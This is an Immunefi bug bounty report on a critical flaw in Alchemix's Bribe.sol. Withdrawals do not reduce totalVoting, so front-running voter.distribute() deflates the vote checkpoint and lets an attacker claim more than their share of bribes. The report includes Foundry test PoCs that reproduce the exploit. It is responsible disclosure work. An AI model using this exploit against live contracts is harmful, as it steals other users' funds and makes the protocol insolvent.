# 31184 - \[SC - Critical] Deflating the total amount of votes in a checkp...

## Deflating the total amount of votes in a checkpoint, to steal bribes and create solvency issues

Submitted on May 14th 2024 at 10:19:20 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31184

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Protocol insolvency

### Description

## Brief/Intro

This report demonstrates how an attacker can deflate the accounting of total votes in a Bribe to claim more tokens than he should, causing solvency issues as other users can't claim their share of bribes.

A coded PoC is included in the **Proof of Concept** section.

## Vulnerability Details

Before diving deep let's recap what `Bribe.deposit(...)` and `Bribe.withdraw(...)` do.

The `Bribe.deposit(...)` function increases the **balanceOf\[tokenId]**, **totalVoting** and creates a new voting checkpoint.

```
function deposit(uint256 amount, uint256 tokenId) external {
		require(msg.sender == voter);

		totalSupply += amount;
		balanceOf[tokenId] += amount;

		totalVoting += amount;

		_writeCheckpoint(tokenId, balanceOf[tokenId]);
		_writeSupplyCheckpoint();
		_writeVotingCheckpoint();

		emit Deposit(msg.sender, tokenId, amount);
}
```

> <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L303-L316>

The function meant to have the opposite effect, `Bribe.withdraw(...)`, decreases the **balanceOf\[tokenId]** but doesn't decrease the **totalVoting** nor creates a voting checkpoint.

```
function withdraw(uint256 amount, uint256 tokenId) external {
		require(msg.sender == voter);

		totalSupply -= amount;
		balanceOf[tokenId] -= amount;

		_writeCheckpoint(tokenId, balanceOf[tokenId]);
		_writeSupplyCheckpoint();

		emit Withdraw(msg.sender, tokenId, amount);
}
```

> <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L319-L329>

The only way to "decrease" the **totalVoting** is by resetting it to 0, calling `Voter.distribute()` once every epoch.

Vote checkpoints are crucial. The total amount of votes is used to distribute rewards proportional to a user's balance.

The higher the number of total votes recorded in an epoch, not belonging to a specific user, the fewer rewards that user receives. The highly simplified pseudo-code is:

```
userRewards = (userVotes * rewardsForThisEpoch) / totalVotes;
```

### The happy path (where everything goes well) is:

```
Epoch `i`:
 └─**Alice** and **Bob** vote with `X` voting power.

Epoch `i+1`
 ├─`voter.distribute();` is executed
 ├─**Alice** votes again.
 ├─**Bob** votes again.

Epoch `i+2`
 ├─`voter.distribute();` is executed
 ├─**Alice** claims epoch rewards.
 └─**Bob** claims epoch rewards.

**Alice** and **Bob** earned the same amount of bribes.

```

But due to how `Bribe.deposit(...)`, `Bribe.withdraw(...)` and `Voter.distribute(...)` work, the following attack vector is possible:

## Attack vector

#### Description

If Alice front-runs the `voter.distribute()` in a new epoch, and votes by calling `Voter.vote(..)`, the following two functions are executed in `Bribe` in this same order:

* First, `Bribe.withdraw(..)` decreases **Alice**'s balance, but does not decrease the value of `totalVoting` and does not create a voting checkpoint representing that there are fewer votes now.
* Then, `Bribe.deposit(..)` increases **Alice**'s balance for the same number that was decreased, then increases the `totalVoting` (now is an inflated number), and creates a voting checkpoint.

Finally, the `voter.distribute()` call is executed and resets the `totalVoting` of this epoch to `0`.

Alice now has a deposit and balance in the current epoch, but the amount of `totalVoting` for this epoch is `0`, as if no one has voted.

> **Quick recap: The higher the value of `totalVoting` relative to Alice's balance the less rewards Alice receive, the lower the amount of `totalVoting` relative to Alice's balance the more rewards Alice can claim.**

#### Diagram of the attack

We think this diagram helps to understand:

```
Epoch `i`:
 └─**Alice** and **Bob** vote with `X` voting power.

Epoch `i+1`
 ├─**Alice** front-runs `voter.distribute()` and votes again.
 ├─`voter.distribute();` is executed
 ├─**Bob** votes again.

Epoch `i+2`
 ├─`voter.distribute();` is executed
 ├─**Alice** claims epoch rewards, and receives an inflated share.
 └─**Bob** tries to claim but there are insufficient funds.

**Alice** received more tokens than she should have, creating insolvency,
and **Bob** can't claim his share of tokens due to lack of funds.
```

#### Step-by-step description of the attack

**Step 1-** Alice front-runs the `voter.distribute(..)` in a new epoch and votes again with **X** balance, inflating the value of `totalVoting` for this epoch by **X**.

**Step 2-** `voter.distribute()` resets to `0` the `totalVoting` of this epoch.

**Step-3** Bob votes with **Y** balance, and a new voting checkpoint is created, increasing the `totalVoting` from 0 to **Y**.

The total amount of balance voted in this epoch is "**X** + **Y**" but the value of the voting checkpoint is **Y**, instead of "**X** + **Y**".

If Alice (or Bob) claims rewards, an inflated share of tokens is received, and the Bribe becomes insolvent.

### Impact

Deflating the total amount of votes in a checkpoint, to steal bribes and create solvency issues

### Proof of Concept

We are going to share 2 foundry tests, the first one is for the "happy path" and in the second one Alice front-runs the `voter.distribute()`, then claim bribes, making the system insolvent and preventing Bob from claiming his shares.

#### Happy path PoC

Add this test to `src/test/Voting.t.sol`

```
function testTotalVotesInflationHappyPath() public {

    uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
    uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);
    address bribeAddress = voter.bribes(address(sushiGauge));

    // Add BAL bribes to sushiGauge
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(bribeAddress);
    address[][] memory tokens = new address[][](1);
    tokens[0] = new address[](1);
    tokens[0][0] = bal;

    // in epoch i, user votes with balance x
    hevm.prank(admin);
    voter.vote(tokenId1, pools, weights, 0);

    // time goes forward
    hevm.warp(block.timestamp + 2);

    // beef votes with balance x
    hevm.prank(beef);
    voter.vote(tokenId2, pools, weights, 0);

    // ------------------- Start epoch i+1
    hevm.warp(newEpoch() + 1);
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    // distribution is executed
    voter.distribute();

    hevm.startPrank(admin);
    // user votes with balance x
    voter.vote(tokenId1, pools, weights, 0);
    hevm.stopPrank();

    // time goes forward
    hevm.warp(block.timestamp + 2);

    // beef votes with balance x
    hevm.prank(beef);
    voter.vote(tokenId2, pools, weights, 0);

    // ------------------- Start epoch i+2
    hevm.warp(newEpoch() + 1);
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    // distribution is executed
    voter.distribute();

    hevm.startPrank(admin);
    // user claim rewards
    voter.claimBribes(bribes, tokens, tokenId1);
    hevm.stopPrank();

    // time goes forward
    hevm.warp(block.timestamp + 2);

    hevm.startPrank(beef);
    // beef claim rewards
    voter.claimBribes(bribes, tokens, tokenId2);
    hevm.stopPrank();

}
```

#### Attack PoC

Add this test to `src/test/Voting.t.sol`

```
function testTotalVotesInflation() public {

    uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
    uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);
    address bribeAddress = voter.bribes(address(sushiGauge));

    // Add BAL bribes to sushiGauge
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(bribeAddress);
    address[][] memory tokens = new address[][](1);
    tokens[0] = new address[](1);
    tokens[0][0] = bal;

    // in epoch i, attacker votes with balance x
    hevm.prank(admin);
    voter.vote(tokenId1, pools, weights, 0);

    // time goes forward
    hevm.warp(block.timestamp + 2);

    // beef votes with balance x
    hevm.prank(beef);
    voter.vote(tokenId2, pools, weights, 0);

    // ------------------- Start epoch i+1
    hevm.warp(newEpoch() + 1);
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    hevm.startPrank(admin);
    // attacker front-runs the distribution and votes with balance X
    voter.vote(tokenId1, pools, weights, 0);
    // now he executes the distribution
    voter.distribute();
    hevm.stopPrank();

    // time goes forward
    hevm.warp(block.timestamp + 2);

    // beef votes with balance X
    hevm.prank(beef);
    voter.vote(tokenId2, pools, weights, 0);

    // ------------------- Start epoch i+2
    hevm.warp(newEpoch() + 1);
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

    // distribution is executed
    voter.distribute();

    hevm.startPrank(admin);
    // attacker claims an inflated share
    voter.claimBribes(bribes, tokens, tokenId1);
    hevm.stopPrank();

    // time goes forward
    hevm.warp(block.timestamp + 2);

    hevm.startPrank(beef);
    // beef tries to claim but his transaction reverts due to lack of funds
    voter.claimBribes(bribes, tokens, tokenId2);
    hevm.stopPrank();

}
```
